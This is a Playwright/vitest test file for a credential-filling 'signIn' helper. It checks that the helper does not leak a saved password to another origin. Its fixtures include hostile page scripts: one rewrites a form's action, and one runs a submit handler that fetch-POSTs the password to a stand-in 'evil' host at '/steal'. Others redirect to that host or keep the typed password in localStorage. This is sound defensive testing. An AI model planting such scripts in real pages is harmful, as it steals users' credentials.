import { once } from "node:events";
import type { IncomingMessage, ServerResponse } from "node:http";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";

import type { Page as WorkerPage } from "@cloudflare/playwright";
import type { Browser, BrowserContext, Page } from "playwright";
import { chromium } from "playwright";
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from "vitest";

import { signIn } from "./login";

const SAVED_SECRET = "s3cret-pw";

interface Hit {
    body: string;
    method: string;
    url: string;
}

type Handler = (request: IncomingMessage, response: ServerResponse, body: string) => void;

/** A local site on its own host, so two of them are two origins. Records every request with its body. */
const site = async (host: string, handler: Handler) => {
    const hits: Hit[] = [];
    const server = createServer((request, response) => {
        let body = "";

        request.on("data", (chunk: Buffer) => {
            body += chunk.toString();
        });
        request.on("end", () => {
            hits.push({ body, method: request.method ?? "", url: request.url ?? "" });
            handler(request, response, body);
        });
    });

    server.listen(0, host);
    await once(server, "listening");

    return { close: () => server.close(), hits, origin: `http://${host}:${(server.address() as AddressInfo).port}` };
};

const html = (response: ServerResponse, markup: string): void => {
    response.setHeader("content-type", "text/html");
    response.end(`<!doctype html><title>Sign in</title>${markup}`);
};

/** The two fields of every login page here: a username and a password. */
const FIELDS = `<input name="user"><input name="pw" type="password">`;

const loginForm = (script = "", attributes = 'method="post" action="/session"'): string =>
    `<form ${attributes}>${FIELDS}<button>Go</button></form><script>${script}</script>`;

describe(signIn, () => {
    let browser: Browser;
    let context: BrowserContext;
    let page: Page;
    let evil: Awaited<ReturnType<typeof site>>;
    let login: Awaited<ReturnType<typeof site>>;
    /** What the login site serves at `/` and answers at `/session`; each case sets them. */
    const fixture: { onSession: Handler; page: string } = { onSession: () => undefined, page: "" };

    beforeAll(async () => {
        browser = await chromium.launch();
        evil = await site("127.0.0.2", (_request, response) => response.end("ok"));
        login = await site("127.0.0.1", (request, response, body) => {
            if (request.url === "/session") {
                fixture.onSession(request, response, body);
            } else if (request.url === "/home") {
                html(response, "<h1>Home</h1>");
            } else {
                html(response, fixture.page);
            }
        });
    });

    afterAll(async () => {
        await browser.close();
        evil.close();
        login.close();
    });

    beforeEach(async () => {
        context = await browser.newContext();
        page = await context.newPage();
        evil.hits.length = 0;
        login.hits.length = 0;
        fixture.onSession = (_request, response) => {
            response.writeHead(303, { location: "/home" });
            response.end();
        };
    });

    afterEach(async () => {
        await context.close();
    });

    const run = async (now: () => number = Date.now) =>
        signIn(
            // The Worker's fork of the same API; its types differ only in a few narrower overloads.
            page as unknown as WorkerPage,
            {
                deadline: Date.now() + 30_000,
                navTimeout: 10_000,
                now,
                origin: login.origin,
                pageTimeout: 5000,
                password: SAVED_SECRET,
                url: `${login.origin}/`,
                username: "ann",
            },
        );

    const passwordLeft = async (): Promise<boolean> =>
        page.evaluate((secret) => [...document.querySelectorAll("input")].some((input) => input.value === secret), SAVED_SECRET);

    const sessionPosts = (): Hit[] => login.hits.filter((hit) => hit.url === "/session");

    it("sends the form by POST to the login's origin and reports where it landed", async () => {
        fixture.page = loginForm();

        const result = await run();

        expect(result).toMatchObject({ submitted: true, success: true, url: `${login.origin}/home` });
        expect(sessionPosts()).toStrictEqual([{ body: `user=ann&pw=${SAVED_SECRET}`, method: "POST", url: "/session" }]);
    });

    it("does not send a form whose action a script moved to another site after the check", async () => {
        fixture.page = loginForm(`document.forms[0].pw.addEventListener("input", (event) => { event.target.form.action = "${evil.origin}/steal"; });`);

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(evil.hits).toStrictEqual([]);
        expect(await passwordLeft()).toBe(false);
    });

    it("blocks a submit handler that posts the password to another site, and clears the field", async () => {
        fixture.page = loginForm(
            `document.forms[0].addEventListener("submit", (event) => { event.preventDefault(); fetch("${evil.origin}/steal", { body: document.forms[0].pw.value, method: "POST", mode: "no-cors" }); });`,
        );

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("tried to send"), submitted: false, success: false });
        expect(evil.hits).toStrictEqual([]);
        expect(await passwordLeft()).toBe(false);
    });

    it.each([307, 308])("fails a %i redirect that would carry the password to another site", async (status) => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            response.writeHead(status, { location: `${evil.origin}/steal` });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("redirect"), submitted: false, success: false });
        expect(evil.hits).toStrictEqual([]);
    });

    it("clears the password when the page throws after it was typed", async () => {
        fixture.page = loginForm(`HTMLFormElement.prototype.requestSubmit = () => { throw new Error("broken"); };`);

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(result).not.toHaveProperty("sessionClosed");
        expect(await passwordLeft()).toBe(false);
    });

    it("tells the caller to close the session when the password cannot be cleared", async () => {
        // The page keeps what was typed and puts it back on every load.
        fixture.page = loginForm(
            `const field = document.forms[0].pw; field.value = localStorage.getItem("p") ?? ""; field.addEventListener("input", () => { if (field.value) localStorage.setItem("p", field.value); }); document.forms[0].addEventListener("submit", (event) => event.preventDefault());`,
        );

        const result = await run();

        expect(result).toStrictEqual({ error: expect.stringContaining("session was closed"), sessionClosed: true, submitted: false, success: false });
    });

    it("reports a form the page held back as not sent", async () => {
        fixture.page = loginForm(`document.forms[0].addEventListener("submit", (event) => event.preventDefault());`);

        const result = await run();

        expect(result).toMatchObject({ error: expect.stringContaining("not sent"), submitted: false, success: false });
        expect(await passwordLeft()).toBe(false);
    });

    it("types nothing into a password field outside a form", async () => {
        fixture.page = FIELDS;

        const result = await run();

        expect(result).toMatchObject({ submitted: false, success: false });
        expect(await page.inputValue("[name=user]")).toBe("");
    });

    it("stops and clears the field when the hold ends after the password was typed", async () => {
        let offset = 0;

        await page.exposeFunction("endHold", () => {
            offset = 60_000;
        });
        fixture.page = loginForm(`document.forms[0].pw.addEventListener("input", () => window.endHold());`);

        const result = await run(() => Date.now() + offset);

        expect(result).toMatchObject({ error: expect.stringContaining("ran out of time"), submitted: false, success: false });
        expect(sessionPosts()).toStrictEqual([]);
        expect(await passwordLeft()).toBe(false);
    });

    it("scrubs the password from the URL and title it reads back", async () => {
        fixture.page = loginForm();
        fixture.onSession = (_request, response) => {
            response.writeHead(303, { location: `/home?echo=${encodeURIComponent(SAVED_SECRET).toLowerCase()}` });
            response.end();
        };

        const result = await run();

        expect(result).toMatchObject({ success: true, url: `${login.origin}/home?echo=[password]` });
    });
});
